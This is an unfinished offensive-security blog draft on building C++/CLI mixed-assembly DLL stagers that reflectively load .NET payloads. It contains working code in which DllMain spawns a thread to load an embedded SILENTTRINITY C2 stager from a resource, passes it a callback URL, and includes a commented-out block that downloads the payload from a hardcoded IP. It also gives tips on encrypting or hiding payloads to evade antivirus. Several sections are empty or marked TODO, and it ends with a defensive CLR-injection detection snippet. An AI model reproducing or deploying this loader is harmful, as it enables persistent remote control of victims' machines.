---
layout: post
title: Mixed Assemblies - Crafting Flexible C++ Reflective Stagers for .NET Assemblies
---

*TLDR: There is not only one type of CLR Injection. You can compile C++ with the /clr option to produce Mixed Assemblies, programs that contain both native and managed code. This can be used to reflectively load .NET Assemblies using native(ish) stagers.*

# Advancing Tradecraft - Context

There is a fundamental flaw with using .NET Assemblies as the unit of execution for offensive payloads: They are reversible to source code. Rather than being compiled to machine code, they are assembled to the Common Intermediate Language (CIL), an object-oriented assembly language that is designed to support the functionality of every common hardware platform and their corresponding Instruction Set Architecture (ISA). CIL is compiled Just-In-Time for execution by .NET's runtime environment, the Common Language Runtime. Machine code (such as x86-64 or ARM) can certainly be reverse-engineered. However, by simply knowing the machine code you may not neccessarily determine the original source code. That is not the case for .NET Assemblies. They contain both their managed code, and the metadeta about that code. As such, they are trivial to reverse engineer and for static analyzers to detect and describe.

## Advantages of Native Code

Using native (unmanaged) languages such as C and C++ provide several significant advantages for offensive tooling. Namely:

* The code they produce can run directly on the hardware of the machine running it. Other than a loader, no additional interpretation is required to execute native code.
* Native code cannot (reliably) be directly decompiled to the exact source code used to create it. Sure, there are decompilers (HexRays, Ghidra, etc.). But their output is only a best guess at the original code, not a copy. Dissassembly and decompilation of machine code presents many challenges, especially when done at scale accross an enterprise where many programs are run ad-hoc by users. This slows down the time involved in capturing and reverse engineering payloads, especially when advanced cryptors, packers, or obfuscators are used to protect the payload.
* 

## Advantages of Managed (.NET) Code

* Compatability: 
* Interoperability:
* Capability:

## Why Not Both?

With C++/CLI, you can create a mostly native executable with full access to 

### C++/CLI

When Visual Studios builds a C++/CLI program, it produces what is called a [Mixed Assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019).

### Moving Between Managed and Native Code

### Mixed Assemblies - Both & Neither

Mixed Assemblies are at the same time, both a native PE file and a .NET Assembly, while also not completely being either. Let me explain...

On one hand, Mixed Assemblies contain native code and use the PE format. As such, you could try to think of them as normal unmanaged PE executables. On the other hand, they also contain managed code and use the .NET Assembly's extension of the PE-COFF format. If you try to use them like normal PE files, then they will usually work. If you try to use them as normal .NET Assemblies, they will probably not work.

So, you should probably not think of them as either one, and instead just consider them *their own thing.*

### How They (sort of) Work with the Reflection API

You may now be thinking: If a Mixed Assembly is an "Assembly", does that mean that I can load it from memory using Assembly.Load(byte[])? Unfortunately not. :-(

Mixed Assemblies may be loaded from disk using the Reflection API, but not from memory. The `Assembly.LoadFrom` and `Assembly.LoadFile` functions work fine when the Mixed Assembly is the same architecture (x86/x64) as the loading process. They can even execute code from DllMain when loaded into a process this way. However, because of [reasons](https://stackoverflow.com/questions/2945080/how-do-i-dynamically-load-raw-assemblies-that-contains-unmanaged-codebypassing), Mixed Assemblies cannot be loaded from memory. Theoretically, you could write a reflective loader that loads the DLL in a similar was as Stephen Fewer's Reflective DLL Injection, but I will leave that as an exercise to the reader. ;-) 

Even with this limitation, the Reflection API can be useful for Mixed Assemblies. If you wish to manually execute your stager from disk, you may do so. And, you may use all of the normal APIs for inspecting managed components at runtime. But don't expect to get away with all of the Assembly.Load(byte[]) abuse that you normally do. 

# A Case Study

A friend of mine was working on a persistence tool. Once it does its thang, the result is that an attacker's DLL is loaded from disk. For that capabilitiy to be useful, you need to craft a DLL that implements ```DLLMain```. That way, your malicious code will run when the DLL is loaded with ```LoadLibrary```. For his demonstration of the tool, he wanted to be able to load SILENTTRINITY (mostly because it's cool). Well, that produces a challenge. SILENTTRINITY is a a .NET-based C2 Framework. Its stager takes the form of a managed EXE or DLL that is usually loaded from memory through Assembly.Load(). But C# (the .NET language used by SILENTTRINITY) does not provide a functionality comparable to ```DLLMain```. Sure, there are some hacky ways to accomplish something similar, but they are as I mentioned: a bit hacky. And, because there's a ```.export``` keyword in the Common Intermediate Language, you can dissassemble .NET Assemblies written in C#, modify one of their functions to be exported in a similar way to C/C++, and then reassemble the .NET Assembly before it is executed. But that requires you to modify each .NET Assembly payload before you use it. Which is annoying, so let's not. And even [if you did that automatically](https://www.codeproject.com/Articles/37675/Simple-Method-of-DLL-Export-without-C-CLI), then you would have to drop a raw, unwrapped SILENTTRINITY DLL to disk, which is just asking to be detected by AV. As an alternative, let's see if we can design something that avoids these problems.

As any good engineering project goes, we'll start with stating our requirements. Whatever the solution, it:

* Must be an on-disk DLL
* Must not require user interaction
* Must run our malicious code when loaded (through DllMain)
* Must execute a stager for our .NET Remote Access Tool
* Ideally, would execute stager from memory without needing any other file(s)
* Ideally, could download stager from URL before executing it
* Ideally, would somehow obfusctate our suspicious code

## Our Solution

One of the ways to load .NET Assemblies through unmanaged code is to use C++/CLI. What is that, you may ask? It is Visual C++ that can be compiled to CIL rather than native machine code. You may specify that code is either managed or native. Native code is written the same as normal C++. The managed version, however, uses a different syntax. To compile managed C++, you must use the /clr option on the Visual Studios compiler. 

### What the Hell is C++/CLI?

C++/CLI is a legacy version of C++ that was specifically designed to allow for easy interoperability between native C++ and managed .NET code. In fact, that was so much the focus of its design, that it was originally referred to as IJW or, "It Just Works" (lol).

![_config.yml]({{ site.baseurl }}/images/Manager/justworks.jpg)

You may choose on a per-module, per-file, or even per-function basis whether or not your C++ code is managed or native. Rather than using P/Invoke to go from managed -> unmanaged code, you may simply call a managed C++/CLI function from native C++. You may also go the other direction (painfully), allowing you to truly move between managed and unmanaged code at will.

Why would you use it legitimately?: https://stackoverflow.com/questions/1933210/c-cli-why-should-i-use-it 

TODO:

* Put our hardcoded values into a header file
* Create a new solution for it. Clean it up.
* Show how to embed binary files as resources (already have the images)
* Clean out the Manager repo
* remove history

### Concept

### Implementation

Advantage of no direct use of COM or the CLR Hosting APIs to load the CLR. It all happens naturally and legitimately.

### Challenges

The main issue that we will have to overcome is [Loader Lock](https://docs.microsoft.com/en-us/cpp/dotnet/initialization-of-mixed-assemblies?view=vs-2019). Because Mixed Assemblies contain native code, they must contend both with the both native Windows Loader and the CLR to be loaded for execution. The Windows loader garauntees that nothing may access code or data in a module before it is initialized. Since the initialization process includes running DllMain, any code in DllMain inherits this protection. As such, Microsoft explicitly tells you not to use any managed code in DllMain. Running managed code requires that the CLR be bootstrapped. If you attempt to do so, you will produce deadlock. The Windows loader has not unlocked the module because DllMain is unfinished, but in order for DllMain to finish, the rest of the module must be unlocked. It turns out, computers are not fond of logical contraditions, and will be rather disappointed with you and refuse to work when asked to perform impossible tasks.

There is a simple solution to this problem: Rather than call managed code directly from DllMain, we will instead create a new thread from a second native function, and then call managed code from that. The new thread will perform two roles.

* Ensure that the parent thread (and process) can continue to execute in the background
* Ensure that the module can finish initialization, allowing the Windows loader to unlock the process-global critical section


### Payload Location

URL or embedded? We will embed it as a resource. In the real world, you should also encrypt it and maybe store it in an image file as a form of stego. This would simulate a legitimate use of PE resources: file icons.

#### The Unmanaged Code

```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "resource.h"
extern void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName);
static DWORD WINAPI launcher(void* h)
{

	std::cout << "Created thread...";

	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
		MAKEINTRESOURCEA(IDR_DLLENCLOSED6), "DLLENCLOSED");
	if (res)
	{
		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
		if (dat)
		{
			unsigned char *dll =
				static_cast<unsigned char*>(::LockResource(dat));
			if (dll)
			{
				size_t len = SizeofResource(static_cast<HMODULE>(h), res);
				LaunchDll(dll, len, "ST", "Main");
			}
		}
	}
	return 0;
}
extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
	if (reasonForCall == DLL_PROCESS_ATTACH)
	{
		CreateThread(0, 0, launcher, h, 0, 0);
	}
	return TRUE;
}

```

#### The Managed Code

Let's get this out of the way: C++/CLI is ugly. It's disgusting. It's hideous. Look at that monstrosity of syntax below.

```cpp
#using <mscorlib.dll>
#include "stdafx.h"
#using <System.dll>

// Load a managed DLL from a byte array and call a static method in the DLL.
// dll - the byte array containing the DLL
// dllLength - the length of 'dll'
// className - the name of the class with a static method to call.
// methodName - the static method to call. Must expect no parameters.
void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName)
{
	// convert passed in parameter to managed values
	cli::array<unsigned char>^ mdll = gcnew cli::array<unsigned char>(dllLength);

	System::Runtime::InteropServices::Marshal::Copy(
		(System::IntPtr)dll, mdll, 0, mdll->Length);
	System::String^ cn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)className);
	System::String^ mn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)methodName);

	/**
	/Downloads the Assembly from a hardcoded URI. Comment out the stuff above.
	
	System::Net::WebClient ^_client = gcnew System::Net::WebClient();

	System::String ^uri = "http://192.168.197.133:8000/SILENTTRINITY_DLL.dll";

	System::Console::WriteLine("Downloading payload from: " + uri);

	cli::array<unsigned char>^ mdll = _client->DownloadData(uri);
	**/

	// used the converted parameters to load the DLL, find, and call the method.
	System::String^ args =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)"http://192.168.197.134:80");

	array< System::Object^ >^ arr = gcnew array< System::Object^ >(1);
	arr[0] = args;

	System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
	a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, arr);
}
```

But, anyway, it works. Allow me to explain:

#### WTF?



### Getting Visual Studios to Cooperate

You don't have to do this anymore. I figured out the correct way you're supposed to do this. :-P

In the New Project dialog, under Installed Templates, select "Visual C++" > "CLR", and then either the Console Application template for EXEs or the Class Library template for DLLs.

* Notes on how to designate a file as not /clr.
* Change Precompiled Headers to Create rather than Yes.

It takes a bit of convincing to get Visual Studios to use C++/CLI. Just inserting the code above into a project will result in compiler errors. As such, follow the guide below to ensure that your project can compile:

If you are using a new project and want to add a new managed code .cpp, you must change some settings in Visual Studio. 1. 

1. Create a .cpp Source File like normal.
2. Right click on it in the Solution Explorer and click Properties.
3. Go to Configuration Properties > C/C++ > General > Common Language RunTime Support and select the "Common Language RunTime Support /clr" option. Do this for both Debug and Release Mode.
4. In debug mode, open the Properties for the file like above. Navigate to Properties > C/C++ > General > Debug Information Format and select the "None" option.
5. In both Debug and Release mode, open the Properties for the file like above. Navigate to Properties > C/C++ > Code Generation > Enable C++ Exceptions and select "No".
6. Follow the instructions in this article to disable Runtime Checking for Debug mode: https://gregs-blog.com/2007/12/31/how-to-fix-visual-studio-bug-rtc1-and-clr-options-are-incompatible/
7. In both Debug and Release mode, open the Properties for the file like above. Navigate to Properties > C/C++ > Precompiled Header option and select "Not using Precompiled Headers".
8. The build should now succeed.
9. Test loading the DLL with the DemoLoad program.

### Staged or Stageless?

Instructions for how to add a payload as a resource with Visual Studios.

1. Create a solution as a Visual C++ project in Visual Studios.
2. Right click "Resource Files" in the Solution Explorer and select Add > Resource...
3. Click the Import... button.
4. Browse to the DLL or EXE you wish to use as a payload. Make sure to select All Files in the File Types of the File Browser.
5. A popup will appear that asks you what type of resource it is. You can choose whatever name you want for the type. For the tutorial, we will use "DLLENCLOSED" for DLLs, and "EXEENCLOSED" for EXEs. Click OK.
6. There should now be a resource of type DLLENCLOSED. By default, it will be named IDR_DLLENCLOSED1. It will be embedded into your built DLL or EXE within the .rsrc PE section.
5. Open the main.cpp source file. Make sure that the type and name in in the FindResourceA() function call reflect the correct resource name and type. To confirm the name and type of the resource, open the .rc file under Resource Files in the Solution Explorer and look at the left-hand pane.
6. The resource should now be embedded. It will be passed to the Assembly.Load function in a raw byte[] format.

#### Creating a Testing Program

TestLoad

#### Testing the Stager

### How Could This Be Extended?

As an EXE. As a reflective DLL.

## OPSec

## Opening it Up in dnSpy

## Bypassing AMSI in .NET v4.8

## Detecting CLR Injection

If you have been reading my blog posts about Donut, you may be familiar with ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. For each module that is loaded, it captures information about the process that loaded the module.

IT has a "CLR Sentry" option that follows some simple logic: If a process loads the CLR, but the program is not a .NET Assembly, then a CLR has been injected into it. This technique can be used to detect C++/CLI stagers for .NET Assemblies. Unfortunately, this means that it will detect ALL programs written in C++/CLI as malicious because they are all represented as Mixed Assemblies.

ModuleMonitor uses the following implementation of this logic in C#. The full code can be found in the ModuleMonitor repo.

```csharp
//CLR Sentry
//Author: TheWover
 while (true)
        {
            //Get the module load.
            Win32_ModuleLoadTrace trace = GetNextModuleLoad();

            //Split the file path into parts delimited by a '\'
            string[] parts = trace.FileName.Split('\\');

            //Check whether it is a .NET Runtime DLL
            if (parts[parts.Length - 1].Contains("msco"))
            {
                //Get a 
                Process proc = Process.GetProcessById((int) trace.ProcessID);

                //Check if the file is a .NET Assembly
                if (!IsValidAssembly(proc.StartInfo.FileName))
                {
                    //If it is not, then the CLR has been injected.
                    Console.WriteLine();

                    Console.WriteLine("[!] CLR Injection has been detected!");

                    //Display information from the event
                    Console.WriteLine("[>] Process {0} has loaded the CLR but is not a .NET Assembly:", trace.ProcessID);
                }
            }
        }
```

When the detection is successful, you should get a detection that looks like the following.

![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/detected.png)

It is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike's 'execute-assembly' command.

## OpSec Considerations

# Conclusion